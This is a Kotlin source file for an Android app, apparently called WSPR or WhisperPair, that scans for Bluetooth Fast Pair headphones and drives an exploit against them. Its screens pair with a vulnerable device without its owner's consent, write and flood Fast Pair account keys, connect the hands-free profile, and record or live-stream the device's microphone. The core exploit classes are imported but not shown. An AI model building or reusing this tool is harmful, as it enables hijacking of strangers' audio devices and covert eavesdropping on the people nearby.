package com.radar.blewifi.wspr

import android.app.Activity
import com.radar.blewifi.R
import android.Manifest
import android.bluetooth.BluetoothAdapter
import android.bluetooth.BluetoothManager
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.media.AudioAttributes
import android.media.AudioFormat
import android.media.AudioTrack
import android.media.MediaPlayer
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.widget.Toast
import androidx.activity.ComponentActivity
import androidx.activity.compose.rememberLauncherForActivityResult
import androidx.activity.compose.setContent
import androidx.activity.enableEdgeToEdge
import androidx.activity.result.contract.ActivityResultContracts
import androidx.core.view.WindowCompat
import androidx.core.view.WindowInsetsCompat
import androidx.core.view.WindowInsetsControllerCompat
import androidx.compose.animation.AnimatedVisibility
import androidx.compose.animation.animateColorAsState
import androidx.compose.animation.core.*
import androidx.compose.foundation.background
import androidx.compose.foundation.border
import androidx.compose.foundation.clickable
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.items
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.shape.CircleShape
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.foundation.verticalScroll
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.automirrored.filled.ArrowBack
import androidx.compose.material.icons.filled.*
import androidx.compose.material.icons.outlined.*
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.clip
import androidx.compose.ui.draw.rotate
import androidx.compose.ui.draw.scale
import androidx.compose.foundation.Image
import androidx.compose.ui.res.painterResource
import androidx.compose.ui.graphics.Brush
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.graphics.vector.ImageVector
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.platform.LocalUriHandler
import androidx.compose.ui.text.font.FontFamily
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.style.TextAlign
import androidx.compose.ui.text.style.TextOverflow
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.core.content.ContextCompat
import androidx.core.content.FileProvider
import com.radar.blewifi.wspr.ui.theme.*
import java.io.File
import java.io.FileInputStream
import java.text.SimpleDateFormat
import java.util.*
import kotlin.concurrent.thread

import com.radar.blewifi.wspr.Scanner as WsprScanner
import com.radar.blewifi.wspr.FastPairDevice
import com.radar.blewifi.wspr.DeviceStatus
import com.radar.blewifi.wspr.VulnerabilityTester
import com.radar.blewifi.wspr.FastPairExploit
import com.radar.blewifi.wspr.BluetoothAudioManager
import com.radar.blewifi.wspr.SignalStrength

class WsprActivity : ComponentActivity() {
    private var scanner: WsprScanner? = null
    private var tester: VulnerabilityTester? = null
    private var exploit: FastPairExploit? = null
    private var audioManager: BluetoothAudioManager? = null
    private val devices = mutableStateListOf<FastPairDevice>()
    private val exploitResults = mutableStateMapOf<String, String>()
    private val audioStates = mutableStateMapOf<String, AudioConnectionState>()
    private val pairedDevices = mutableStateListOf<String>()  // Track successfully paired devices
    private var hasShownFirstFailWarning = false
    private val showUnpairWarning = mutableStateOf(false)
    private val showHfpErrorDialog = mutableStateOf(false)

    data class AudioConnectionState(
        val isConnected: Boolean = false,
        val isRecording: Boolean = false,
        val isListening: Boolean = false,
        val recordingFile: String? = null,
        val message: String? = null,
        val hasHfpError: Boolean = false
    )

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        enableEdgeToEdge()

        // Hide system bars for fullscreen immersive mode
        WindowCompat.getInsetsController(window, window.decorView).apply {
            systemBarsBehavior = WindowInsetsControllerCompat.BEHAVIOR_SHOW_TRANSIENT_BARS_BY_SWIPE
            hide(WindowInsetsCompat.Type.systemBars())
        }

        // Load saved paired devices
        loadPairedDevices()

        val bluetoothManager = getSystemService(Context.BLUETOOTH_SERVICE) as? BluetoothManager
        val bluetoothAdapter = bluetoothManager?.adapter

        tester = VulnerabilityTester(this)
        exploit = FastPairExploit(this)
        audioManager = BluetoothAudioManager(this)

        audioManager?.initialize { ready ->
            if (ready) {
                android.util.Log.d("WSPR", "Audio manager initialized")
                checkExistingHfpConnections()
            }
        }

        scanner = WsprScanner(bluetoothAdapter) { device ->
            runOnUiThread {
                val index = devices.indexOfFirst { it.address == device.address }
                if (index == -1) {
                    devices.add(device)
                } else {
                    val currentStatus = devices[index].status
                    devices[index] = device.copy(status = currentStatus)
                }
            }
        }

        setContent {
            val prefs = remember { getSharedPreferences("settings", Context.MODE_PRIVATE) }
            var themeName by remember { 
                mutableStateOf(prefs.getString("theme_name", "DEFAULT") ?: "DEFAULT") 
            }
            
            // Listen for preference changes to update theme in real-time
            DisposableEffect(Unit) {
                val listener = android.content.SharedPreferences.OnSharedPreferenceChangeListener { p, key ->
                    if (key == "theme_name") {
                        themeName = p.getString(key, "DEFAULT") ?: "DEFAULT"
                    }
                }
                prefs.registerOnSharedPreferenceChangeListener(listener)
                onDispose {
                    prefs.unregisterOnSharedPreferenceChangeListener(listener)
                }
            }

            WSPRTheme(themeName = themeName) {
                val colorScheme = androidx.compose.material3.MaterialTheme.colorScheme
                Surface(
                    modifier = Modifier.fillMaxSize(),
                    color = colorScheme.background
                ) {
                    WSPRApp(
                        context = this@WsprActivity,
                        devices = devices,
                        exploitResults = exploitResults,
                        audioStates = audioStates,
                        pairedDevices = pairedDevices,
                        showUnpairWarning = showUnpairWarning.value,
                        onDismissUnpairWarning = { showUnpairWarning.value = false },
                        showHfpErrorDialog = showHfpErrorDialog.value,
                        onDismissHfpErrorDialog = { showHfpErrorDialog.value = false },
                        recordingsDir = getExternalFilesDir(null) ?: filesDir,
                        onScanToggle = { isScanning, showAll ->
                            if (isScanning) scanner?.startScanning(showAll) else scanner?.stopScanning()
                        },
                        onTestDevice = { device -> testDevice(device) },
                        onClearDevices = {
                            devices.clear()
                            exploitResults.clear()
                            audioStates.clear()
                        },
                        onExploitDevice = { device -> exploitDevice(device) },
                        onWriteAccountKey = { device -> writeAccountKey(device) },
                        onFloodKeys = { device -> floodAccountKeys(device) },
                        onConnectHfp = { device -> connectHfp(device) },
                        onStartRecording = { device -> startRecording(device) },
                        onStopRecording = { device -> stopRecording(device) },
                        onStartListening = { device -> startListening(device) },
                        onStopListening = { device -> stopListening(device) },
                        onCheckConnections = { checkExistingHfpConnections() }
                    )
                }
            }
        }
    }

    private fun testDevice(device: FastPairDevice) {
        val index = devices.indexOfFirst { it.address == device.address }
        if (index != -1) {
            devices[index] = devices[index].copy(status = DeviceStatus.TESTING)
            tester?.testDevice(device.address) { status ->
                runOnUiThread {
                    val newIndex = devices.indexOfFirst { it.address == device.address }
                    if (newIndex != -1) {
                        devices[newIndex] = devices[newIndex].copy(status = status)

                        // Show first-fail warning if device is patched/error and we haven't shown it yet
                        if (!hasShownFirstFailWarning && (status == DeviceStatus.PATCHED || status == DeviceStatus.ERROR)) {
                            hasShownFirstFailWarning = true
                            showUnpairWarning.value = true
                        }
                    }
                }
            }
        }
    }

    private fun checkExistingHfpConnections() {
        val am = audioManager ?: return
        val connectedDevices = am.getConnectedDevices()
        for (btDevice in connectedDevices) {
            val address = btDevice.address
            if (pairedDevices.contains(address)) {
                audioStates[address] = AudioConnectionState(
                    isConnected = true,
                    message = "HFP connected"
                )
            }
        }
    }

    private fun loadPairedDevices() {
        val prefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
        val saved = prefs.getStringSet(KEY_PAIRED_DEVICES, emptySet()) ?: emptySet()
        pairedDevices.clear()
        pairedDevices.addAll(saved)
    }

    private fun savePairedDevices() {
        val prefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
        prefs.edit().putStringSet(KEY_PAIRED_DEVICES, pairedDevices.toSet()).apply()
    }

    private fun addPairedDevice(address: String) {
        if (!pairedDevices.contains(address)) {
            pairedDevices.add(address)
            savePairedDevices()
        }
    }

    private fun exploitDevice(device: FastPairDevice) {
        exploitResults[device.address] = "Initializing..."

        exploit?.exploit(
            targetAddress = device.address,
            onProgress = { progress ->
                runOnUiThread {
                    exploitResults[device.address] = progress
                }
            },
            onResult = { result ->
                runOnUiThread {
                    when (result) {
                        is FastPairExploit.ExploitResult.Success -> {
                            exploitResults[device.address] = "PAIRED! BR/EDR: ${result.brEdrAddress}"
                            addPairedDevice(device.address)
                        }
                        is FastPairExploit.ExploitResult.PartialSuccess -> {
                            exploitResults[device.address] = "PARTIAL: ${result.brEdrAddress} - ${result.message}"
                            addPairedDevice(device.address)
                        }
                        is FastPairExploit.ExploitResult.Failed -> {
                            exploitResults[device.address] = "FAILED: ${result.reason}"
                        }
                        is FastPairExploit.ExploitResult.AccountKeyResult -> {
                            exploitResults[device.address] = if (result.success) "KEY: ${result.message}" else "FAILED: ${result.message}"
                        }
                        else -> {}
                    }
                }
            }
        )
    }

    private fun writeAccountKey(device: FastPairDevice) {
        exploitResults[device.address] = "Writing account key..."

        exploit?.writeAccountKeyDirect(device.address) { result ->
            runOnUiThread {
                when (result) {
                    is FastPairExploit.ExploitResult.AccountKeyResult -> {
                        exploitResults[device.address] = if (result.success)
                            "KEY WRITTEN! Device registered."
                        else
                            "KEY FAILED: ${result.message}"
                    }
                    else -> exploitResults[device.address] = "Unexpected result"
                }
            }
        }
    }

    private fun floodAccountKeys(device: FastPairDevice) {
        exploitResults[device.address] = "Flooding: 0/10..."

        exploit?.floodAccountKeys(device.address, 10) { current, total, done ->
            runOnUiThread {
                exploitResults[device.address] = if (done) "FLOOD: $current/$total done" else "Flooding: $current/$total..."
            }
        }
    }

    private fun connectHfp(device: FastPairDevice) {
        val am = audioManager ?: return
        audioStates[device.address] = AudioConnectionState(message = "Connecting HFP...")

        am.connectAudioProfile(device.address) { state ->
            runOnUiThread {
                when (state) {
                    is BluetoothAudioManager.AudioState.Connected -> {
                        audioStates[device.address] = AudioConnectionState(
                            isConnected = true,
                            message = "HFP connected - ready for audio"
                        )
                    }
                    is BluetoothAudioManager.AudioState.Error -> {
                        val userMessage = when (state.message) {
                            "HFP_PERMISSION_DENIED" -> "Manual connection required"
                            "HFP_MANUAL_REQUIRED" -> "Manual connection required"
                            "HFP_TIMEOUT" -> "Connection timed out"
                            else -> state.message
                        }
                        audioStates[device.address] = AudioConnectionState(
                            message = userMessage,
                            hasHfpError = true
                        )
                        showHfpErrorDialog.value = true
                    }
                    else -> {}
                }
            }
        }
    }

    private fun startRecording(device: FastPairDevice) {
        val am = audioManager ?: return
        val outputDir = getExternalFilesDir(null) ?: filesDir

        audioStates[device.address] = audioStates[device.address]?.copy(
            isRecording = true, message = "Recording..."
        ) ?: AudioConnectionState(isRecording = true, message = "Recording...")

        am.startRecording(
            outputDir = outputDir,
            onStateChange = { state ->
                runOnUiThread {
                    when (state) {
                        is BluetoothAudioManager.AudioState.Recording -> {
                            audioStates[device.address] = audioStates[device.address]?.copy(
                                isRecording = true, message = "Recording microphone..."
                            ) ?: AudioConnectionState(isRecording = true)
                        }
                        is BluetoothAudioManager.AudioState.Error -> {
                            audioStates[device.address] = audioStates[device.address]?.copy(
                                isRecording = false, message = "Error: ${state.message}"
                            ) ?: AudioConnectionState(message = state.message)
                        }
                        else -> {}
                    }
                }
            },
            onRecordingComplete = { info ->
                runOnUiThread {
                    val duration = info.durationMs / 1000
                    audioStates[device.address] = audioStates[device.address]?.copy(
                        isRecording = false,
                        recordingFile = info.file.absolutePath,
                        message = "Saved: ${info.file.name} (${duration}s)"
                    ) ?: AudioConnectionState(recordingFile = info.file.absolutePath)
                }
            }
        )
    }

    private fun stopRecording(device: FastPairDevice) {
        audioManager?.stopRecording()
    }

    private fun startListening(device: FastPairDevice) {
        val am = audioManager ?: return

        audioStates[device.address] = audioStates[device.address]?.copy(
            isListening = true, message = "Starting live audio..."
        ) ?: AudioConnectionState(isListening = true, message = "Starting...")

        am.startListening { state ->
            runOnUiThread {
                when (state) {
                    is BluetoothAudioManager.AudioState.Listening -> {
                        audioStates[device.address] = audioStates[device.address]?.copy(
                            isListening = true, message = "LIVE - Listening to microphone"
                        ) ?: AudioConnectionState(isListening = true)
                    }
                    is BluetoothAudioManager.AudioState.Error -> {
                        audioStates[device.address] = audioStates[device.address]?.copy(
                            isListening = false, message = "Error: ${state.message}"
                        ) ?: AudioConnectionState(message = state.message)
                    }
                    is BluetoothAudioManager.AudioState.Connected -> {
                        audioStates[device.address] = audioStates[device.address]?.copy(
                            isListening = false, message = "Stopped listening"
                        ) ?: AudioConnectionState(isConnected = true)
                    }
                    else -> {}
                }
            }
        }
    }

    private fun stopListening(device: FastPairDevice) {
        audioManager?.stopListening()
        audioStates[device.address] = audioStates[device.address]?.copy(
            isListening = false, message = "Stopped"
        ) ?: AudioConnectionState()
    }

    override fun onDestroy() {
        super.onDestroy()
        scanner?.stopScanning()
        audioManager?.release()
    }

    override fun onBackPressed() {
        super.onBackPressed()
        overridePendingTransition(android.R.anim.fade_in, android.R.anim.fade_out)
    }
}

enum class Screen { Scanner, Paired, Recordings }

private const val PREFS_NAME = "whisperpair_prefs"
private const val KEY_PAIRED_DEVICES = "paired_devices"

@OptIn(ExperimentalMaterial3Api::class)
@Composable
fun WSPRApp(
    context: Context,
    devices: List<FastPairDevice>,
    exploitResults: Map<String, String>,
    audioStates: Map<String, WsprActivity.AudioConnectionState>,
    pairedDevices: List<String>,
    showUnpairWarning: Boolean,
    onDismissUnpairWarning: () -> Unit,
    showHfpErrorDialog: Boolean,
    onDismissHfpErrorDialog: () -> Unit,
    recordingsDir: File,
    onScanToggle: (Boolean, Boolean) -> Unit,
    onTestDevice: (FastPairDevice) -> Unit,
    onClearDevices: () -> Unit,
    onExploitDevice: (FastPairDevice) -> Unit,
    onWriteAccountKey: (FastPairDevice) -> Unit,
    onFloodKeys: (FastPairDevice) -> Unit,
    onConnectHfp: (FastPairDevice) -> Unit,
    onStartRecording: (FastPairDevice) -> Unit,
    onStopRecording: (FastPairDevice) -> Unit,
    onStartListening: (FastPairDevice) -> Unit,
    onStopListening: (FastPairDevice) -> Unit,
    onCheckConnections: () -> Unit
) {
    val prefs = remember { context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE) }
    var currentScreen by remember { mutableStateOf(Screen.Scanner) }
    var showAboutDialog by remember { mutableStateOf(false) }

    // Scanner state - lifted up to persist across tab switches
    var isScanning by remember { mutableStateOf(false) }
    var showAllDevices by remember { mutableStateOf(false) }  // Default to Fast Pair only

    val primaryColor = MaterialTheme.colorScheme.primary

    Scaffold(
        topBar = {
            TopAppBar(
                title = { },
                navigationIcon = {
                    TextButton(
                        onClick = { 
                            (context as? Activity)?.apply {
                                finish()
                                overridePendingTransition(android.R.anim.fade_in, android.R.anim.fade_out)
                            }
                        },
                        modifier = Modifier.padding(start = 8.dp)
                    ) {
                        Text(
                            "CLOSE",
                            color = MaterialTheme.colorScheme.primary,
                            fontFamily = FontFamily.Monospace,
                            fontSize = 12.sp
                        )
                    }
                },
                colors = TopAppBarDefaults.topAppBarColors(
                    containerColor = MaterialTheme.colorScheme.background,
                    titleContentColor = MaterialTheme.colorScheme.onBackground
                )
            )
        },
        bottomBar = {
            NavigationBar(containerColor = MaterialTheme.colorScheme.surface) {
                NavigationBarItem(
                    selected = currentScreen == Screen.Scanner,
                    onClick = { currentScreen = Screen.Scanner },
                    icon = { Icon(Icons.Default.BluetoothSearching, contentDescription = null) },
                    label = { Text("Scanner") },
                    colors = NavigationBarItemDefaults.colors(
                        selectedIconColor = primaryColor,
                        selectedTextColor = primaryColor,
                        indicatorColor = primaryColor.copy(alpha = 0.2f),
                        unselectedIconColor = MaterialTheme.colorScheme.onSurfaceVariant.copy(alpha = 0.6f),
                        unselectedTextColor = MaterialTheme.colorScheme.onSurfaceVariant.copy(alpha = 0.6f)
                    )
                )
                NavigationBarItem(
                    selected = currentScreen == Screen.Paired,
                    onClick = { currentScreen = Screen.Paired },
                    icon = {
                        BadgedBox(badge = {
                            if (pairedDevices.isNotEmpty()) {
                                Badge(containerColor = MaterialTheme.colorScheme.error) { Text("${pairedDevices.size}") }
                            }
                        }) {
                            Icon(Icons.Default.Headphones, contentDescription = null)
                        }
                    },
                    label = { Text("Paired") },
                    colors = NavigationBarItemDefaults.colors(
                        selectedIconColor = primaryColor,
                        selectedTextColor = primaryColor,
                        indicatorColor = primaryColor.copy(alpha = 0.2f),
                        unselectedIconColor = MaterialTheme.colorScheme.onSurfaceVariant.copy(alpha = 0.6f),
                        unselectedTextColor = MaterialTheme.colorScheme.onSurfaceVariant.copy(alpha = 0.6f)
                    )
                )
                NavigationBarItem(
                    selected = currentScreen == Screen.Recordings,
                    onClick = { currentScreen = Screen.Recordings },
                    icon = { Icon(Icons.Default.Audiotrack, contentDescription = null) },
                    label = { Text("Recordings") },
                    colors = NavigationBarItemDefaults.colors(
                        selectedIconColor = primaryColor,
                        selectedTextColor = primaryColor,
                        indicatorColor = primaryColor.copy(alpha = 0.2f),
                        unselectedIconColor = MaterialTheme.colorScheme.onSurfaceVariant.copy(alpha = 0.6f),
                        unselectedTextColor = MaterialTheme.colorScheme.onSurfaceVariant.copy(alpha = 0.6f)
                    )
                )
            }
        },
        containerColor = MaterialTheme.colorScheme.background
    ) { paddingValues ->
        when (currentScreen) {
            Screen.Scanner -> ScannerScreen(
                devices = devices,
                exploitResults = exploitResults,
                paddingValues = paddingValues,
                isScanning = isScanning,
                showAllDevices = showAllDevices,
                onScanningChange = { isScanning = it },
                onShowAllDevicesChange = { showAllDevices = it },
                onScanToggle = onScanToggle,
                onTestDevice = onTestDevice,
                onClearDevices = onClearDevices,
                onExploitDevice = onExploitDevice
            )
            Screen.Paired -> PairedDevicesScreen(
                context = context,
                devices = devices.filter { pairedDevices.contains(it.address) },
                audioStates = audioStates,
                exploitResults = exploitResults,
                paddingValues = paddingValues,
                onConnectHfp = onConnectHfp,
                onStartRecording = onStartRecording,
                onStopRecording = onStopRecording,
                onStartListening = onStartListening,
                onStopListening = onStopListening,
                onWriteAccountKey = onWriteAccountKey,
                onFloodKeys = onFloodKeys,
                onCheckConnections = onCheckConnections
            )
            Screen.Recordings -> RecordingsScreen(
                recordingsDir = recordingsDir,
                paddingValues = paddingValues
            )
        }
    }

    if (showAboutDialog) {
        AboutDialog(onDismiss = { showAboutDialog = false })
    }

    if (showUnpairWarning) {
        UnpairWarningDialog(onDismiss = onDismissUnpairWarning)
    }

    if (showHfpErrorDialog) {
        HfpErrorDialog(context = context, onDismiss = onDismissHfpErrorDialog)
    }
}

@Composable
fun HfpErrorDialog(context: Context, onDismiss: () -> Unit) {
    AlertDialog(
        onDismissRequest = onDismiss,
        icon = { Icon(Icons.Default.HeadsetOff, null, tint = MaterialTheme.colorScheme.error, modifier = Modifier.size(48.dp)) },
        title = { Text("Manual Connection Required", textAlign = TextAlign.Center, fontWeight = FontWeight.Bold) },
        text = {
            Column {
                Text("Android restricts direct audio profile connections for non-system apps. You need to connect manually through settings.", style = MaterialTheme.typography.bodyMedium)
                Spacer(Modifier.height(12.dp))
                Text("Steps:", style = MaterialTheme.typography.bodyMedium, fontWeight = FontWeight.SemiBold, color = MaterialTheme.colorScheme.primary)
                Spacer(Modifier.height(8.dp))
                Text("1. Open Bluetooth settings", style = MaterialTheme.typography.bodySmall)
                Text("2. Find the paired device in the list", style = MaterialTheme.typography.bodySmall)
                Text("3. Tap on it to connect the audio profile", style = MaterialTheme.typography.bodySmall)
                Text("4. Return here - audio controls will be available", style = MaterialTheme.typography.bodySmall)
                Spacer(Modifier.height(12.dp))
                Text("The device is already paired via exploit. Once you manually connect audio in settings, the app can access the microphone.", style = MaterialTheme.typography.labelSmall, color = MaterialTheme.colorScheme.onSurfaceVariant.copy(alpha = 0.6f))
            }
        },
        confirmButton = {
            Button(
                onClick = {
                    onDismiss()
                    context.startActivity(Intent(Settings.ACTION_BLUETOOTH_SETTINGS))
                },
                colors = ButtonDefaults.buttonColors(containerColor = MaterialTheme.colorScheme.primary)
            ) {
                Icon(Icons.Default.Bluetooth, null, Modifier.size(18.dp))
                Spacer(Modifier.width(8.dp))
                Text("Open Bluetooth Settings")
            }
        },
        dismissButton = { TextButton(onClick = onDismiss) { Text("Later", color = MaterialTheme.colorScheme.onSurfaceVariant.copy(alpha = 0.6f)) } },
        containerColor = MaterialTheme.colorScheme.surface
    )
}

@Composable
fun UnpairWarningDialog(onDismiss: () -> Unit) {
    AlertDialog(
        onDismissRequest = onDismiss,
        icon = { Icon(Icons.Default.BluetoothDisabled, null, tint = MaterialTheme.colorScheme.error, modifier = Modifier.size(48.dp)) },
        title = { Text("Device May Be Already Paired", textAlign = TextAlign.Center, fontWeight = FontWeight.Bold) },
        text = {
            Column {
                Text("The test failed. This could mean:", style = MaterialTheme.typography.bodyMedium)
                Spacer(Modifier.height(12.dp))
                BulletPoint("The device is already paired in your phone's Bluetooth settings")
                BulletPoint("The device firmware is patched")
                BulletPoint("The device doesn't support Fast Pair")
                Spacer(Modifier.height(16.dp))
                Text("To test properly:", style = MaterialTheme.typography.bodyMedium, fontWeight = FontWeight.SemiBold, color = MaterialTheme.colorScheme.primary)
                Spacer(Modifier.height(8.dp))
                Text("1. Go to Settings → Bluetooth", style = MaterialTheme.typography.bodySmall)
                Text("2. Find the device and tap 'Forget' or 'Unpair'", style = MaterialTheme.typography.bodySmall)
                Text("3. Return here and test again", style = MaterialTheme.typography.bodySmall)
                Spacer(Modifier.height(12.dp))
                Text("Android remembers paired devices and won't allow new pairing attempts.", style = MaterialTheme.typography.labelSmall, color = MaterialTheme.colorScheme.onSurfaceVariant.copy(alpha = 0.6f))
            }
        },
        confirmButton = { Button(onClick = onDismiss, colors = ButtonDefaults.buttonColors(containerColor = MaterialTheme.colorScheme.primary)) { Text("Got It") } },
        containerColor = MaterialTheme.colorScheme.surface
    )
}

@OptIn(ExperimentalMaterial3Api::class)
@Composable
fun ScannerScreen(
    devices: List<FastPairDevice>,
    exploitResults: Map<String, String>,
    paddingValues: PaddingValues,
    isScanning: Boolean,
    showAllDevices: Boolean,
    onScanningChange: (Boolean) -> Unit,
    onShowAllDevicesChange: (Boolean) -> Unit,
    onScanToggle: (Boolean, Boolean) -> Unit,
    onTestDevice: (FastPairDevice) -> Unit,
    onClearDevices: () -> Unit,
    onExploitDevice: (FastPairDevice) -> Unit
) {
    var showPermissionDeniedDialog by remember { mutableStateOf(false) }
    var showBluetoothDisabledDialog by remember { mutableStateOf(false) }
    val context = LocalContext.current

    val permissions = remember {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            arrayOf(Manifest.permission.BLUETOOTH_SCAN, Manifest.permission.BLUETOOTH_CONNECT, Manifest.permission.RECORD_AUDIO)
        } else {
            arrayOf(Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.BLUETOOTH, Manifest.permission.BLUETOOTH_ADMIN, Manifest.permission.RECORD_AUDIO)
        }
    }

    fun hasAllPermissions() = permissions.all { ContextCompat.checkSelfPermission(context, it) == PackageManager.PERMISSION_GRANTED }
    fun isBluetoothEnabled() = (context.getSystemService(Context.BLUETOOTH_SERVICE) as? BluetoothManager)?.adapter?.isEnabled == true

    val permissionLauncher = rememberLauncherForActivityResult(ActivityResultContracts.RequestMultiplePermissions()) { results ->
        if (results.all { it.value }) {
            if (isBluetoothEnabled()) { onScanningChange(true); onScanToggle(true, showAllDevices) }
            else showBluetoothDisabledDialog = true
        } else showPermissionDeniedDialog = true
    }

    val bluetoothEnableLauncher = rememberLauncherForActivityResult(ActivityResultContracts.StartActivityForResult()) {
        if (isBluetoothEnabled()) { onScanningChange(true); onScanToggle(true, showAllDevices) }
    }

    fun startScan() {
        when {
            !hasAllPermissions() -> permissionLauncher.launch(permissions)
            !isBluetoothEnabled() -> showBluetoothDisabledDialog = true
            else -> { onScanningChange(true); onScanToggle(true, showAllDevices) }
        }
    }

    Column(modifier = Modifier.fillMaxSize().padding(paddingValues).padding(horizontal = 16.dp)) {
        ScanControlCard(isScanning = isScanning, deviceCount = devices.size, onToggleScan = {
            if (!isScanning) startScan() else { onScanningChange(false); onScanToggle(false, showAllDevices) }
        })

        Spacer(Modifier.height(8.dp))

        // Filter chips row
        Row(
            modifier = Modifier
                .fillMaxWidth()
                .clip(RoundedCornerShape(12.dp))
                .background(MaterialTheme.colorScheme.surface)
                .padding(4.dp),
            horizontalArrangement = Arrangement.spacedBy(0.dp)
        ) {
            // Fast Pair Only chip
            Box(
                modifier = Modifier
                    .weight(1f)
                    .clip(RoundedCornerShape(8.dp))
                    .background(if (!showAllDevices) MaterialTheme.colorScheme.primary else Color.Transparent)
                    .clickable {
                        if (showAllDevices) {
                            onShowAllDevicesChange(false)
                            onClearDevices()
                            if (isScanning) onScanToggle(true, false)
                        }
                    }
                    .padding(vertical = 10.dp),
                contentAlignment = Alignment.Center
            ) {
                Text(
                    "Fast Pair",
                    fontSize = 13.sp,
                    fontWeight = if (!showAllDevices) FontWeight.SemiBold else FontWeight.Normal,
                    color = if (!showAllDevices) MaterialTheme.colorScheme.onPrimary else MaterialTheme.colorScheme.onSurfaceVariant.copy(alpha = 0.6f)
                )
            }
            // All BLE Devices chip
            Box(
                modifier = Modifier
                    .weight(1f)
                    .clip(RoundedCornerShape(8.dp))
                    .background(if (showAllDevices) MaterialTheme.colorScheme.primary else Color.Transparent)
                    .clickable {
                        if (!showAllDevices) {
                            onShowAllDevicesChange(true)
                            onClearDevices()
                            if (isScanning) onScanToggle(true, true)
                        }
                    }
                    .padding(vertical = 10.dp),
                contentAlignment = Alignment.Center
            ) {
                Text(
                    "BLE",
                    fontSize = 13.sp,
                    fontWeight = if (showAllDevices) FontWeight.SemiBold else FontWeight.Normal,
                    color = if (showAllDevices) MaterialTheme.colorScheme.onPrimary else MaterialTheme.colorScheme.onSurfaceVariant.copy(alpha = 0.6f)
                )
            }
        }

        Spacer(Modifier.height(12.dp))

        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.SpaceBetween, verticalAlignment = Alignment.CenterVertically) {
            Text("Discovered Devices", style = MaterialTheme.typography.titleMedium, fontWeight = FontWeight.SemiBold, color = MaterialTheme.colorScheme.onBackground)
            Row(verticalAlignment = Alignment.CenterVertically) {
                if (devices.isNotEmpty()) {
                    Text("${devices.size} found", style = MaterialTheme.typography.bodySmall, color = MaterialTheme.colorScheme.onSurfaceVariant.copy(alpha = 0.6f))
                    Spacer(Modifier.width(8.dp))
                    IconButton(onClick = onClearDevices, modifier = Modifier.size(24.dp)) {
                        Icon(Icons.Default.Clear, null, Modifier.size(16.dp), tint = MaterialTheme.colorScheme.onSurfaceVariant.copy(alpha = 0.6f))
                    }
                }
            }
        }

        Spacer(Modifier.height(8.dp))

        if (devices.isEmpty()) {
            EmptyStateCard(isScanning)
        } else {
            LazyColumn(verticalArrangement = Arrangement.spacedBy(8.dp), modifier = Modifier.weight(1f)) {
                items(devices.sortedByDescending { it.rssi }) { device ->
                    DeviceCard(
                        device = device,
                        exploitResult = exploitResults[device.address],
                        onTest = { onTestDevice(device) },
                        onExploit = { onExploitDevice(device) }
                    )
                }
                item { Spacer(Modifier.height(8.dp)) }
            }
        }
    }

    if (showPermissionDeniedDialog) {
        AlertDialog(
            onDismissRequest = { showPermissionDeniedDialog = false },
            icon = { Icon(Icons.Default.PermDeviceInformation, null, tint = MaterialTheme.colorScheme.error, modifier = Modifier.size(48.dp)) },
            title = { Text("PERMISSIONS REQUIRED", fontWeight = FontWeight.Bold, color = MaterialTheme.colorScheme.secondary) },
            text = { Text("WSPR needs Bluetooth and Microphone permissions to function.", color = MaterialTheme.colorScheme.primary) },
            confirmButton = {
                Button(onClick = {
                    showPermissionDeniedDialog = false
                    context.startActivity(Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                        data = Uri.fromParts("package", context.packageName, null)
                    })
                }, colors = ButtonDefaults.buttonColors(containerColor = MaterialTheme.colorScheme.secondary, contentColor = MaterialTheme.colorScheme.onSecondary)) { Text("OPEN SETTINGS") }
            },
            dismissButton = { TextButton(onClick = { showPermissionDeniedDialog = false }) { Text("ABORT", color = MaterialTheme.colorScheme.onSurfaceVariant.copy(alpha = 0.6f)) } },
            containerColor = MaterialTheme.colorScheme.surface
        )
    }

    if (showBluetoothDisabledDialog) {
        AlertDialog(
            onDismissRequest = { showBluetoothDisabledDialog = false },
            icon = { Icon(Icons.Default.BluetoothDisabled, null, tint = MaterialTheme.colorScheme.error, modifier = Modifier.size(48.dp)) },
            title = { Text("Bluetooth Disabled", fontWeight = FontWeight.Bold) },
            text = { Text("Please enable Bluetooth to scan for devices.") },
            confirmButton = {
                Button(onClick = {
                    showBluetoothDisabledDialog = false
                    bluetoothEnableLauncher.launch(Intent(BluetoothAdapter.ACTION_REQUEST_ENABLE))
                }, colors = ButtonDefaults.buttonColors(containerColor = MaterialTheme.colorScheme.primary, contentColor = MaterialTheme.colorScheme.onPrimary)) { Text("Enable") }
            },
            dismissButton = { TextButton(onClick = { showBluetoothDisabledDialog = false }) { Text("Dismiss", color = MaterialTheme.colorScheme.onSurfaceVariant.copy(alpha = 0.6f)) } },
            containerColor = MaterialTheme.colorScheme.surface
        )
    }
}

@Composable
fun PairedDevicesScreen(
    context: Context,
    devices: List<FastPairDevice>,
    audioStates: Map<String, WsprActivity.AudioConnectionState>,
    exploitResults: Map<String, String>,
    paddingValues: PaddingValues,
    onConnectHfp: (FastPairDevice) -> Unit,
    onStartRecording: (FastPairDevice) -> Unit,
    onStopRecording: (FastPairDevice) -> Unit,
    onStartListening: (FastPairDevice) -> Unit,
    onStopListening: (FastPairDevice) -> Unit,
    onWriteAccountKey: (FastPairDevice) -> Unit,
    onFloodKeys: (FastPairDevice) -> Unit,
    onCheckConnections: () -> Unit
) {
    // Check for existing HFP connections when screen is shown
